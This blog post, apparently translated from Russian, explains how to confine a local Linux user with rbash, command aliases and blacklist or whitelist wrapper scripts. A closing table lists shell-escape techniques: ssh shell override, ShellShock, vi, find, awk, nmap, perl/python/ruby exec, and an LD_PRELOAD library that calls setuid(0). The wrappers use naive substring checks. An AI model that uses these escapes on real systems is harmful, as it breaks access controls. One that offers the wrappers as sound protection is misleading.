<div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/webt/74/bk/1j/74bk1jiajt8gxpjnpfpm2_veawk.png" width="200" height="200" alt="Cat" align="right">  Once the following task appeared: to create a local user in the Linux operating system, with limited access to folders and files, including not only editing, but also viewing, as well as the ability to use only authorized utilities.  Only local access is provided; there is no network access. <br><br>  In order not to reinvent the wheel, first of all I began to dig the Internet, as a result of which the following options were found: <br><br><ul><li>  access restrictions via ssh, sftp network services (did not work) </li><li>  differentiation of access rights by the linux operating system itself (it didn’t fit, I would like a universal solution) </li><li>  use chroot (did not fit) </li><li>  the use of third-party utilities, such as SELinux (did not fit, complicates the system). </li></ul><br>  As a result of the search, a built-in mechanism for restricting the user's capabilities inside the bash shell was found; it is called <a href="https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html">Restricted Shell or rbash</a> . <br><a name="habracut"></a><br>  It has the following limitations: <br><br><ul><li>  there is no possibility of changing the directory with the cd command </li><li>  cannot reset or change the values ​​of the variables SHELL, PATH, ENV, BASH_ENV </li><li>  forbidden to specify commands containing / (slash) </li><li>  it is forbidden to import functions from the main shell </li><li>  It is forbidden to redirect output using the operators&gt;, &lt;, |, &lt;&gt;,&gt; &amp;, &amp;&gt;, &gt;&gt; </li><li>  It is forbidden to use the exec command to substitute the command, etc. </li></ul><br>  There is a minus, this is security, so it is imperative to add alias to commands in the .bashrc shell behavior file (information will be further). <br><br>  Of course, rbash is out of the box, it does not solve all the tasks, so with an example we will consider creating a user and setting up his environment for the complete solution of our problem. <br><br>  Further, all operations are performed from the superuser (root). <br><br>  1. Create a limited shell <br><br><pre><code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">'/bin/bash -r'</span></span> &gt; /bin/zbash chmod +x /bin/zbash</code> </pre> <br>  2. Create user <br><br><pre> <code class="bash hljs">adduser --home /home/zuser --shell /bin/zbash zuser</code> </pre> <br>  3. Change directory rights <br><br><pre> <code class="bash hljs">chown root.zuser /home/zuser chmod 750 /home/zuser</code> </pre> <br>  4. Go to the directory and clear it. <br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> ~zuser ls -a rm .bash* rm .profile ls -a</code> </pre> <br>  5. Configure the shell and rights <br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"PATH=:/home/zuser/bin"</span></span> &gt; .bashrc <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"alias help='echo access is limited'"</span></span> &gt;&gt; .bashrc <span class="hljs-comment"><span class="hljs-comment"># alias на команду help echo "bind 'set disable-completion on'" &gt;&gt; .bashrc # Отключает автодополнение на tab mkdir -p bin chmod 750 bin chown -R root.zuser /home/zuser chmod 640 .bash*</span></span></code> </pre> <br>  The .bashrc file defines the behavior of the shell, alias for commands or additional <a href="http://xgu.ru/wiki/shopt">options</a> can be added to this file. <br><br>  To ensure security, issue the following commands: <br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"alias echo=':'"</span></span> &gt;&gt; .bashrc <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"alias cat=':'"</span></span> &gt;&gt; .bashrc <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"alias bash=':'"</span></span> &gt;&gt; .bashrc <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"alias sh=':'"</span></span> &gt;&gt; .bashrc <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"alias ln=':'"</span></span> &gt;&gt; .bashrc <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"alias set=':'"</span></span> &gt;&gt; .bashrc <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"alias uset=':'"</span></span> &gt;&gt; .bashrc <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"alias export=':'"</span></span> &gt;&gt; .bashrc <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"alias typeset=':'"</span></span> &gt;&gt; .bashrc <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"alias declare=':'"</span></span> &gt;&gt; .bashrc <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"alias alias=':'"</span></span> &gt;&gt; .bashrc <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"alias unalias=':'"</span></span> &gt;&gt; .bashrc</code> </pre> <br>  This list can be continued ... <br><br>  6. Check the work <br><br><pre> <code class="bash hljs">root@host: su zuser zuser@host: <span class="hljs-built_in"><span class="hljs-built_in">help</span></span> access is limited zuser@host: <span class="hljs-built_in"><span class="hljs-built_in">pwd</span></span> /home/zuser zuser@host: ls /tmp/ bash: ls: команда не найдена zuser@host: /bin/ls bash: /bin/ls: ограниченный режим в команде нельзя использовать косую черту {/} zuser@host: <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-variable"><span class="hljs-variable">$PATH</span></span> :/home/zuser/bin zuser@host: PATH=/bin/ bash: PATH: переменная только для чтения zuser@host: <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span></code> </pre><br>  7. Add valid commands <br><br><pre> <code class="bash hljs">ln -s /bin/ping /home/zuser/bin/ping</code> </pre> <br>  Importantly, the paths in the ln command must be specified completely. <br><br>  8. Wrappers can be used to limit the command options. <br><br><pre> <code class="bash hljs">mkdir /var/scripts <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"/usr/sbin/useradd -D"</span></span> &gt; /var/scripts/user-info chmod +x /var/scripts/user-info ln -s /var/scripts/user-info /home/zuser/bin/user-info</code> </pre> <br>  9. To work with files and folders, you can also create a wrapper. <br>  with <b>black list</b> (allow everything except): <br>  - create file <br><br><pre> <code class="bash hljs">nano /var/scripts/ls</code> </pre> <br>  - file contents <br><br><pre> <code class="bash hljs">blacklist=<span class="hljs-string"><span class="hljs-string">"\? ../ /etc /bin /boot /var"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> var <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-variable"><span class="hljs-variable">$blacklist</span></span> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> [[ $* == *<span class="hljs-variable"><span class="hljs-variable">$var</span></span>* ]]; <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">'Access is denied:'</span></span> $* <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span> <span class="hljs-keyword"><span class="hljs-keyword">fi</span></span> <span class="hljs-keyword"><span class="hljs-keyword">done</span></span> /bin/ls $*</code> </pre> <br>  blacklist - a variable containing a blacklist of directories or files (separated by a space) <br>  - add command for user zuser <br><br><pre> <code class="bash hljs">chmod +x /var/scripts/ls ln -s /var/scripts/ls /home/zuser/bin/ls</code> </pre> <br>  This script allows you to run the ls command with any keys for directories and files that do not match the black list. <br><br>  with <b>white list</b> (ban everything except): <br>  - create file <br><br><pre> <code class="bash hljs">nano /var/scripts/cat</code> </pre> <br>  - file contents <br><br><pre> <code class="bash hljs">whitelist=<span class="hljs-string"><span class="hljs-string">"./ /tmp/"</span></span> <span class="hljs-comment"><span class="hljs-comment"># белый список for var in $whitelist do if [[ $* == *$var* ]]; then /bin/cat $* # запуск утилиты cat с заданными параметрами exit fi done echo 'Access is denied:' $*</span></span></code> </pre> <br>  whitelist - a variable containing a white list of directories or files (separated by a space) <br>  - add command for user zuser <br><br><pre> <code class="bash hljs">chmod +x /var/scripts/cat ln -s /var/scripts/cat /home/zuser/bin/cat</code> </pre> <br>  This script allows you to execute the cat command with the specified files in the white list. <br><br>  <b>Done</b> , in the end got the following result: <br><br><ul><li>  we created user zuser with rbash shell </li><li>  disabled the ability to use autocompletion in the console </li><li>  zuser can only run utilities from the / home / zuser / bin directory </li><li>  added ping command to zuser </li><li>  added own user-info command to user zuser </li><li>  the zuser user has been limited to running the ls and cat commands through the wrapper </li></ul><br><br>  Unfortunately, this method does not guarantee 100% security, and with certain knowledge and qualifications, the user can leave this shell.  Thank you <a href="https://habr.com/ru/users/jouretz/" class="user_link">Jouretz</a> <a href="https://habr.com/ru/users/arheops/" class="user_link">arheops</a> <a href="https://habr.com/ru/users/yadr/" class="user_link">YaDr</a> in the comments they gave examples of circumventing shell constraints. <br><br>  The following vulnerabilities exist in this solution (Shell Escape), which must be taken into account: <br><table><tbody><tr><td>  PATH </td><td>  The ability to change the variable PATH </td></tr><tr><td>  Copying files by scp </td><td>  Ability to upload your script </td></tr><tr><td>  When connecting via ssh, you can change the shell </td><td><pre> <code class="bash hljs">ssh zuser@xxxx -t <span class="hljs-string"><span class="hljs-string">"/bin/bash"</span></span></code> </pre> </td></tr><tr><td>  When connecting via ssh, you can change the shell configuration file </td><td><pre> <code class="bash hljs">ssh zuser@xxxx -t <span class="hljs-string"><span class="hljs-string">"bash --noprofile"</span></span></code> </pre> </td></tr><tr><td>  When connecting via ssh, you can use ShellShock </td><td><pre> <code class="bash hljs">ssh zuser@xxxx -t <span class="hljs-string"><span class="hljs-string">"() { :; }; /bin/bash"</span></span></code> </pre> </td></tr><tr><td>  Through utilities vi, vim </td><td><pre> <code class="bash hljs">:!bash</code> </pre> </td></tr><tr><td>  Through utilities vi, vim </td><td><pre> <code class="bash hljs">:<span class="hljs-built_in"><span class="hljs-built_in">set</span></span> shell=/bin/bash :shell</code> </pre> </td></tr><tr><td>  Through utilities man, more, less </td><td><pre> <code class="bash hljs">!bash</code> </pre> </td></tr><tr><td>  Through the find utility </td><td><pre> <code class="bash hljs">find . -maxdepth 0 -execdir /bin/bash \;</code> </pre> </td></tr><tr><td>  Through the awk utility </td><td><pre> <code class="bash hljs">awk <span class="hljs-string"><span class="hljs-string">'BEGIN {system("/bin/bash")}'</span></span></code> </pre> </td></tr><tr><td>  Through the nmap utility </td><td><pre> <code class="bash hljs">nmap --interactive</code> </pre> </td></tr><tr><td>  Through the nmap utility </td><td><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"os.execute('/bin/sh')"</span></span> &gt; exploit.nse nmap --script=exploit.nse</code> </pre> </td></tr><tr><td>  Via perl </td><td><pre> <code class="bash hljs">perl -e <span class="hljs-string"><span class="hljs-string">'exec "/bin/bash";'</span></span></code> </pre> </td></tr><tr><td>  Via python </td><td><pre> <code class="bash hljs">python -c <span class="hljs-string"><span class="hljs-string">'import pty; pty.spawn("/bin/bash")'</span></span></code> </pre> </td></tr><tr><td>  Via ruby </td><td><pre> <code class="bash hljs">ruby: <span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> <span class="hljs-string"><span class="hljs-string">"/bin/bash"</span></span></code> </pre> </td></tr><tr><td>  Through LD_PRELOAD </td><td>  Create an evil.c file: <br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdlib.h&gt; void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("echo work"); system("/bin/bash --noprofile"); }</span></span></span></span></code> </pre> <br>  Compile: <br><pre> <code class="bash hljs">gcc -fPIC -shared -o evil.so evil.c -nostartfiles</code> </pre> <br>  We transfer the resulting evil.so file to the machine with the closed console and execute: <br><pre> <code class="bash hljs">LD_PRELOAD=<span class="hljs-variable"><span class="hljs-variable">$PWD</span></span>/evil.so ls</code> </pre> <br>  As an argument, any available command </td></tr></tbody></table><br>  Due to the presence of a sufficiently large number of vulnerabilities, this method can only be used for a local user on non-critical systems; it is better to use chroot or other utilization restrictions for users to access the network via ssh. <br><br>  I hope this information will be useful. </div>